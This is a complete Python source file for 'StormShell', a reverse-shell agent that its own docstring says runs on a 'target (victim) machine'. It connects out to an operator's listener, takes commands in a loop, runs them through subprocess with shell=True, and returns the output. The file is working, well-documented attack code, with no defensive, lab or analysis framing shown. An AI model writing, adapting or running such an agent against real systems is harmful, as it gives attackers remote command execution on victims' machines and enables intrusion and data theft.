#!/usr/bin/env python3
"""
StormShell - Agent Module

A lightweight TCP client that connects back to the StormShell listener.
This module runs on the target (victim) machine, establishes a reverse
TCP connection to the handler, and enters a receive loop — executing
OS commands via subprocess and returning results to the operator.
"""

import argparse
import logging
import os
import socket
import subprocess
import sys

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BUFFER_SIZE = 4096  # Max bytes to receive per recv() call

# ---------------------------------------------------------------------------
# Logger configuration
# ---------------------------------------------------------------------------
LOG_FORMAT = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
logger = logging.getLogger("stormshell.agent")


class Agent:
    """
    Reverse-shell agent that initiates an outbound TCP connection to the
    StormShell listener and enters a receive loop to process commands
    sent by the operator.

    Attributes:
        host (str):   IP address of the remote listener.
        port (int):   TCP port of the remote listener.
        sock (socket.socket | None): The client socket instance.
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 4444) -> None:
        """
        Initialize the Agent with the target listener address.

        Args:
            host: The IP address of the StormShell listener to connect to.
            port: The TCP port of the StormShell listener to connect to.
        """
        self.host: str = host
        self.port: int = port
        self.sock: socket.socket | None = None

    # ------------------------------------------------------------------
    # Socket lifecycle
    # ------------------------------------------------------------------

    def _create_socket(self) -> None:
        """Create a TCP client socket for the outbound connection."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        logger.debug("Client socket created.")

    def _connect(self) -> None:
        """
        Attempt to connect to the remote StormShell listener.

        Raises:
            ConnectionRefusedError: If the listener is not running or
                                    actively rejecting connections.
            TimeoutError:           If the connection attempt times out.
            OSError:                For any other network-level failure.
        """
        try:
            self.sock.connect((self.host, self.port))
            logger.info(
                "Connected to listener at %s:%d", self.host, self.port
            )
            print(f"[+] Connected to {self.host}:{self.port}")
        except ConnectionRefusedError:
            logger.error(
                "Connection refused by %s:%d — is the listener running?",
                self.host,
                self.port,
            )
            print(
                f"[!] Connection refused by {self.host}:{self.port}. "
                f"Make sure the listener is running."
            )
            self._cleanup()
            sys.exit(1)
        except TimeoutError:
            logger.error(
                "Connection to %s:%d timed out.", self.host, self.port
            )
            print(f"[!] Connection to {self.host}:{self.port} timed out.")
            self._cleanup()
            sys.exit(1)
        except OSError as exc:
            logger.error(
                "Failed to connect to %s:%d — %s",
                self.host,
                self.port,
                exc,
            )
            print(f"[!] Connection error: {exc}")
            self._cleanup()
            sys.exit(1)

    # ------------------------------------------------------------------
    # Command execution helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _handle_cd(path: str) -> str:
        """
        Change the agent's working directory using os.chdir().

        subprocess spawns a child process, so a 'cd' executed inside it
        would only affect that child — not the agent itself.  This method
        applies the directory change at the agent (parent) level.

        Args:
            path: Target directory path.  Defaults to the user's home
                  directory when an empty string is supplied.

        Returns:
            A human-readable status message indicating success or failure.
        """
        target = path if path else os.path.expanduser("~")
        try:
            os.chdir(target)
            cwd = os.getcwd()
            logger.info("Changed directory to %s", cwd)
            return f"[+] Changed directory to: {cwd}"
        except FileNotFoundError:
            msg = f"[!] Directory not found: {target}"
            logger.warning(msg)
            return msg
        except PermissionError:
            msg = f"[!] Permission denied: {target}"
            logger.warning(msg)
            return msg
        except OSError as exc:
            msg = f"[!] Failed to change directory: {exc}"
            logger.error(msg)
            return msg

    @staticmethod
    def _execute_command(command: str) -> str:
        """
        Execute an OS command via subprocess and return its output.

        Uses ``shell=True`` so that shell built-ins and pipelines work
        correctly.  Both stdout and stderr are captured and merged into
        a single result string.

        Args:
            command: The raw shell command string to execute.

        Returns:
            The combined stdout + stderr output of the command, or a
            status / error message if the command produced no output or
            raised an exception.
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=30,
            )

            stdout = result.stdout.decode("utf-8", errors="replace").strip()
            stderr = result.stderr.decode("utf-8", errors="replace").strip()

            # Merge stdout and stderr into a single response.
            output_parts: list[str] = []
            if stdout:
                output_parts.append(stdout)
            if stderr:
                output_parts.append(stderr)

            if output_parts:
                return "\n".join(output_parts)

            # Command succeeded but produced no output (e.g. mkdir, touch).
            return (
                f"[+] Command executed successfully (no output). "
                f"Exit code: {result.returncode}"
            )

        except subprocess.TimeoutExpired:
            msg = f"[!] Command timed out: {command}"
            logger.warning(msg)
            return msg
        except OSError as exc:
            msg = f"[!] Execution error: {exc}"
            logger.error(msg)
            return msg

    # ------------------------------------------------------------------
    # Interactive receive loop
    # ------------------------------------------------------------------

    def _receive_loop(self) -> None:
        """
        Continuously listen for commands from the StormShell listener,
        execute them on the host operating system, and send results back.

        Behaviour:
            - 'exit'  → break out of the loop and shut down.
            - 'cd ..' → handled via os.chdir() for persistent effect.
            - Others  → executed via subprocess; output returned.
        """
        logger.info("Entered receive loop — waiting for commands.")

        while True:
            try:
                data = self.sock.recv(BUFFER_SIZE)

                # Empty data means the listener disconnected.
                if not data:
                    logger.warning("Listener disconnected (empty data).")
                    break

                command = data.decode("utf-8", errors="replace").strip()
                logger.debug("Received command: %s", command)

                # Handle the 'exit' shutdown command.
                if command.lower() == "exit":
                    logger.info("Exit command received. Shutting down.")
                    break

                # Handle 'cd' as a special case (persistent directory change).
                if command.lower() == "cd" or command.lower().startswith("cd "):
                    path = command[3:].strip()
                    response = self._handle_cd(path)
                else:
                    response = self._execute_command(command)

                # Send the result back to the listener.
                try:
                    self.sock.sendall(response.encode("utf-8"))
                    logger.debug("Sent response (%d bytes).", len(response))
                except (BrokenPipeError, ConnectionResetError, OSError) as exc:
                    logger.error("Failed to send response — %s", exc)
                    break

            except (ConnectionResetError, OSError) as exc:
                logger.error("Connection lost — %s", exc)
                break

        logger.info("Receive loop ended.")

    # ------------------------------------------------------------------
    # Cleanup helpers
    # ------------------------------------------------------------------

    def _cleanup(self) -> None:
        """Gracefully close the client socket if it is open."""
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                # Socket may already be disconnected — ignore.
                pass
            finally:
                self.sock.close()
                self.sock = None
                logger.debug("Client socket closed.")

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """
        Full agent lifecycle: create socket → connect to listener →
        receive loop → graceful shutdown.
        """
        try:
            self._create_socket()
            self._connect()
            self._receive_loop()

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt received. Shutting down …")
            logger.warning("Keyboard interrupt — shutting down.")

        finally:
            self._cleanup()
            print("[*] Socket closed. Agent exiting.\n")
            logger.info("Socket closed. Agent exited.")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    """
    Build and return the argument parser for the StormShell agent.

    Returns:
        argparse.Namespace with `host`, `port`, and `verbose` attributes.
    """
    parser = argparse.ArgumentParser(
        description="StormShell Agent — Reverse Shell Client",
    )
    parser.add_argument(
        "--host",
        type=str,
        default="127.0.0.1",
        help="IP address of the StormShell listener (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="TCP port of the StormShell listener (default: 4444)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        default=False,
        help="Enable verbose (DEBUG) logging output",
    )
    return parser.parse_args()


def main() -> None:
    """Parse arguments, configure logging, and start the agent."""
    args = _parse_args()

    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=log_level, format=LOG_FORMAT)

    print("\n[*] StormShell Agent starting …")
    logger.info(
        "Agent initializing — target %s:%d", args.host, args.port
    )

    agent = Agent(host=args.host, port=args.port)
    agent.start()


if __name__ == "__main__":
    main()
